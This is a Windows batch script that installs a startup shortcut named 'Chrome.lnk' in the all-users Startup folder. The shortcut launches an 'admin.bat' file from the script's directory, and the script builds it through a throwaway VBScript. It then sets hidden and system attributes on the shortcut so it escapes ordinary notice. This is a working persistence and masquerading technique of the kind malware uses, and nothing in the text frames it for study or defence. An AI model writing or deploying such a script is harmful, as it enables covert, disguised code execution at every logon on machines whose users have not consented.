CD /D "%~dp0"

set "shortcutPath=C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Chrome.lnk"

attrib -h -s "%shortcutPath%"


del "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Chrome.lnk"

@echo off
attrib -h -s "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

set "targetPath=%CD%\admin.bat"
set "shortcutPath=C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Chrome.lnk"

echo Set WshShell = WScript.CreateObject("WScript.Shell") > CreateShortcut.vbs
echo Set shortcut = WshShell.CreateShortcut("%shortcutPath%") >> CreateShortcut.vbs
echo shortcut.TargetPath = "%targetPath%" >> CreateShortcut.vbs
echo shortcut.Save >> CreateShortcut.vbs

cscript CreateShortcut.vbs

del CreateShortcut.vbs
@echo off
set "shortcutPath=C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Chrome.lnk"

attrib +h +s "%shortcutPath%"

pause